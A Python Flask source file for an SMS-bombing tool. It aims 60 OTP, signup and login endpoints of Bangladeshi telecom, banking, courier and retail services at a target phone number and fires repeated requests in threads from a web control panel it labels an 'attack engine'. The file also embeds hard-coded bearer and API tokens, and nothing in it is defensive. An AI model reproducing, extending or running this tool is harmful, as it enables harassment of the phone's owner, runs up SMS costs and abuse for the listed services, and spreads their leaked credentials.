import random
import time
import requests
import json
import threading
from flask import Flask, render_template, request, jsonify
from concurrent.futures import ThreadPoolExecutor
from requests.structures import CaseInsensitiveDict

app = Flask(__name__)

# ----------[ SYSTEM UTILS ]----------

def get_random_user_agent():
    return random.choice([
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1"
    ])

def get_random_chrome_version():
    v = random.randint(110, 120)
    return f'"Not_A Brand";v="8", "Chromium";v="{v}", "Google Chrome";v="{v}"'

# ----------[ SYSTEM STATE ]----------

class SystemState:
    def __init__(self):
        self.active = False
        self.target = ""
        self.sent = 0
        self.total = 0
        self.success = 0
        self.logs = []
        self.session = requests.Session()

state = SystemState()

# ----------[ ALL 60 APIs ]----------

def api_1(number):  # Paperfly
    try:
        headers = {'accept': 'application/json', 'content-type': 'application/json', 'user-agent': get_random_user_agent()}
        json_data = {'full_name': 'Salman Biswas', 'company_name': 'ProTest', 'email_address': f'test{random.randint(1000,9999)}@gmail.com', 'phone_number': number}
        return state.session.post('https://go-app.paperfly.com.bd/merchant/api/react/registration/request_registration.php', headers=headers, json=json_data, timeout=10)
    except: return None

def api_2(number):  # Ghoorilearning
    try:
        headers = {'content-type': 'application/json', 'user-agent': get_random_user_agent()}
        return state.session.post('https://api.ghoorilearning.com/api/auth/signup/otp?_app_platform=web', headers=headers, json={'mobile_no': number}, timeout=10)
    except: return None

def api_3(number):  # Doctime
    try:
        json_data = {'data': {'country_calling_code': '88', 'contact_no': number, 'headers': {'PlatForm': 'Web'}}}
        return state.session.post('https://us-central1-doctime-465c7.cloudfunctions.net/sendAuthenticationOTPToPhoneNumber', json=json_data, timeout=10)
    except: return None

def api_4(number):  # Sundarban
    try:
        json_data = {'operationName': 'CreateAccessToken', 'variables': {'accessTokenFilter': {'userName': number}}, 'query': 'mutation CreateAccessToken($accessTokenFilter: AccessTokenInput!) { createAccessToken(accessTokenFilter: $accessTokenFilter) { message statusCode result { phone otpCounter __typename } __typename }}'}
        return state.session.post('https://api-gateway.sundarbancourierltd.com/graphql', json=json_data, timeout=10)
    except: return None

def api_5(number):  # Apex4u
    try:
        return state.session.post('https://api.apex4u.com/api/auth/login', json={'phoneNumber': number}, timeout=10)
    except: return None

def api_6(number):  # Robi Doorstep
    try:
        headers = {"Authorization": "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJqdGkiOiJnaGd4eGM5NzZoaiIsImlhdCI6MTY5MjY0MjcyOCwibmJmIjoxNjkyNjQyNzI4LCJleHAiOjE2OTI2NDYzMjgsInVpZCI6IjU3OGpmZkBoZ2hoaiIsInN1YiI6IlJvYmlXZWJTaXRlVjIifQ.5xbPa1JiodXeIST6v9c0f_4thF6tTBzaLLfuHlN7NSc", "Content-Type": "application/json"}
        return state.session.post("https://webapi.robi.com.bd/v1/send-otp", json={"phone_number": number, "type": "doorstep"}, headers=headers, timeout=10)
    except: return None

def api_7(number):  # Banglalink Validation
    try:
        return state.session.get(f'https://web-api.banglalink.net/api/v1/user/number/validation/{number}', timeout=10)
    except: return None

def api_8(number):  # Banglalink OTP
    try:
        return state.session.post('https://web-api.banglalink.net/api/v1/user/otp-login/request', json={'mobile': number}, timeout=10)
    except: return None

def api_9(number):  # GP
    try:
        return state.session.post('https://webloginda.grameenphone.com/backend/api/v1/otp', data={'msisdn': number}, timeout=10)
    except: return None

def api_10(number):  # Robi My Offer
    try:
        return state.session.post('https://webapi.robi.com.bd/v1/send-otp', json={'phone_number': number, 'type': 'my_offer'}, timeout=10)
    except: return None

# [Logic for API 11-60]
def api_11(n): return state.session.post("https://da-api.robi.com.bd/da-nll/otp/send", json={"msisdn": n}, timeout=10)
def api_12(n): return state.session.post('https://webapi.robi.com.bd/v1/chat/send-otp', json={'phone_number': n, 'name': 'Salman', 'type': 'video-chat'}, timeout=10)
def api_13(n): return state.session.post('https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp', json={'phoneNumber': n}, timeout=10)
def api_14(n): return state.session.post('https://fundesh.com.bd/api/auth/generateOTP', json={'msisdn': n}, timeout=10)
def api_15(n): return state.session.get(f'https://bikroy.com/data/phone_number_login/verifications/phone_login?phone={n}', timeout=10)
def api_16(n): return state.session.post('https://api.motionview.com.bd/api/send-otp-phone-signup', json={'phone': n}, timeout=10)
def api_17(n): return state.session.post('https://api-dynamic.chorki.com/v2/auth/login?country=BD&platform=web', json={'number': '+88'+n}, timeout=10)
def api_18(n): return state.session.post('https://user-api.jslglobal.co:444/v2/send-otp', json={'phone': '+88'+n, 'jatri_token': 'J9vuqzxHyaWa3VaT66NsvmQdmUmwwrHj'}, timeout=10)
def api_19(n): return state.session.get(f'https://chinaonlinebd.com/api/login/getOtp?phone={n}', timeout=10)
def api_20(n): return state.session.post('https://api.deeptoplay.com/v2/auth/login?country=BD&platform=web', json={'number': '+88'+n}, timeout=10)
def api_21(n): return state.session.post('https://api.shikho.com/auth/v2/send/sms', json={'phone': n, 'type': 'student', 'auth_type': 'signup'}, timeout=10)
def api_22(n): return state.session.post("https://api.redx.com.bd/v1/user/signup", json={"name":"Salman","phoneNumber":n,"service":"redx"}, timeout=10)
def api_23(n): return state.session.get(f"https://bikroy.com/data/phone_number_login/verifications/phone_login?phone={n}", timeout=10)
def api_24(n): return state.session.post(f'https://www.bioscopelive.com/en/login/send-otp?phone=88{n}&operator=bd-otp', timeout=10)
def api_25(n): return state.session.post(f'https://ss.binge.buzz/otp/send/login{n}', timeout=10)
def api_26(n): return state.session.post("https://fundesh.com.bd/api/auth/generateOTP", json={"msisdn":n}, timeout=10)
def api_27(n): return state.session.post("https://applink.com.bd/appstore-v4-server/login/otp/request", json={"msisdn": "88"+n}, timeout=10)
def api_28(n): return state.session.post("https://chokrojan.com/api/v1/passenger/login/mobile", json={"mobile_number": n}, timeout=10)
def api_29(n): return state.session.post("https://chokrojan.com/api/v1/passenger/login/mobile", json={"mobile_number": n}, timeout=10)
def api_30(n): return state.session.post("https://ezybank.dhakabank.com.bd/VerifIDExt2/api/CustOnBoarding/VerifyMobileNumber", json={"mobileNo": n, "product_id": "250", "requestChannel": "MOB"}, timeout=10)
def api_31(n): return state.session.post('https://us-central1-doctime-465c7.cloudfunctions.net/sendAuthenticationOTPToPhoneNumber', json={'data':{'contact_no': n}}, timeout=10)
def api_32(n): return state.session.post("https://core.easy.com.bd/api/v1/registration", json={"mobile": n, "password": "pass", "password_confirmation": "pass"}, timeout=10)
def api_33(n): return state.session.post("https://eshop-api.banglalink.net/api/v1/customer/send-otp", json={"type": "phone", "phone": n}, timeout=10)
def api_34(n): return state.session.post('https://freedom.fsiblbd.com/verifidext/api/CustOnBoarding/VerifyMobileNumber', json={'mobileNo': n, 'product_id': '122'}, timeout=10)
def api_35(n): return state.session.post(f"https://api.mygp.cinematic.mobi/api/v1/otp/88{n}/SBENT_3GB7D", timeout=10)
def api_36(n): return state.session.post("https://bkshopthc.grameenphone.com/api/v1/fwa/request-for-otp", json={"phone": n}, timeout=10)
def api_37(n): return state.session.post(f"https://app.hishabee.business/api/V2/otp/send?mobile_number={n}", timeout=10)
def api_38(n): return state.session.get(f"http://apibeta.iqra-live.com/api/v1/sent-otp/{n}", timeout=10)
def api_39(n): return state.session.post("https://smart1216.robi.com.bd/robi_sivr/public/login/phone", json={"cli": n.lstrip('0')}, timeout=10)
def api_40(n): return state.session.post("https://user-api.jslglobal.co:444/v1/send-otp", data={"phone": "+88"+n, "jatri_token": "J9vuqzxHyaWa3VaT66NsvmQdmUmwwrHj"}, timeout=10)
def api_41(n): return state.session.post("https://www.mcbaffiliate.com/Affiliate/RequestOTP", data={"PhoneNumber": n}, timeout=10)
def api_42(n): return state.session.post("https://mithaibd.com/api/login/", json={"phone": n, "password1": "pass"}, timeout=10)
def api_43(n): return state.session.post("https://api.englishmojabd.com/api/v1/auth/login", json={"phone": "+88"+n}, timeout=10)
def api_44(n): return state.session.post("https://moveon.com.bd/api/v1/customer/auth/phone/request-otp", json={"phone": n}, timeout=10)
def api_45(n): return state.session.post("https://api.osudpotro.com/api/v1/users/send_otp", json={"mobile": "+88-"+n}, timeout=10)
def api_46(n): return state.session.get(f"https://mygp.grameenphone.com/mygpapi/v2/otp-login?msisdn=88{n}", timeout=10)
def api_47(n): return state.session.post("https://go-app.paperfly.com.bd/merchant/api/react/registration/request_registration.php", json={"phone_number": n}, timeout=10)
def api_48(n): return state.session.post("https://auth.qcoom.com/api/v1/otp/send", json={"mobileNumber": "+88"+n}, timeout=10)
def api_49(n): return state.session.post("https://reseller.circle.com.bd/api/v2/auth/signup", json={"email_or_phone": "+88"+n}, timeout=10)
def api_50(n): return state.session.post("https://backend-api.shomvob.co/api/v2/otp/phone", json={"phone": n}, timeout=10)
def api_51(n): return api_4(n) # Duplicate Sundarban
def api_52(n): return state.session.post("https://api.toybox.live/bdapps_handler.php", json={"MobileNumber": "88"+n, "PackageID": 100}, timeout=10)
def api_53(n): return state.session.get(f"https://api.win2gain.com/api/Users/RequestOtp?msisdn=88{n}", timeout=10)
def api_54(n): return state.session.post("https://api.bdkepler.com/api_middleware-0.0.1-RELEASE/registration-generate-otp", json={"walletNumber": n}, timeout=10)
def api_55(n): return state.session.post("https://rootsedulive.com/api/auth/register", data={"phone": f"88{n}"}, timeout=10)
def api_56(n): return state.session.post("https://rootsedulive.com/api/auth/forget-password", data={"phoneOrEmail": f"88{n}"}, timeout=10)
def api_57(n): return api_41(n) # Duplicate MCB
def api_58(n): return api_37(n) # Duplicate Hishabee
def api_59(n): return api_36(n) # Duplicate GP
def api_60(n): return state.session.post(f"https://api.mygp.cinematic.mobi/api/v1/send-common-otp/88{n}/", timeout=10)

# Build the Master List
ALL_APIS = [globals()[f'api_{i}'] for i in range(1, 61)]

# ----------[ ATTACK ENGINE ]----------

def process_sms(number):
    if not state.active: return
    api = random.choice(ALL_APIS)
    try:
        r = api(number)
        state.sent += 1
        if r and r.status_code in [200, 201]:
            state.success += 1
            state.logs.insert(0, f"STRIKE: API Hit successful on gateway.")
        else:
            state.logs.insert(0, f"MISS: Gateway rejected request.")
    except:
        state.logs.insert(0, "FAIL: Gateway connection timeout.")
    if len(state.logs) > 15: state.logs.pop()

def attack_worker(number, count):
    state.active, state.target, state.total, state.sent, state.success = True, number, count, 0, 0
    state.logs = ["SYSTEM: INITIALIZING ATTACK..."]
    with ThreadPoolExecutor(max_workers=5) as executor:
        for _ in range(count):
            if not state.active: break
            executor.submit(process_sms, number)
            time.sleep(0.1)
    state.logs.insert(0, "SYSTEM: OPERATION FINISHED.")
    state.active = False

@app.route('/')
def home(): return render_template('index.html')

@app.route('/start', methods=['POST'])
def start():
    d = request.json
    threading.Thread(target=attack_worker, args=(d['num'], int(d['count']))).start()
    return jsonify({"status": "launched"})

@app.route('/stop', methods=['POST'])
def stop():
    state.active = False
    return jsonify({"status": "terminated"})

@app.route('/status')
def status():
    return jsonify({"active": state.active, "sent": state.sent, "total": state.total, "success": state.success, "logs": state.logs, "target": state.target})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
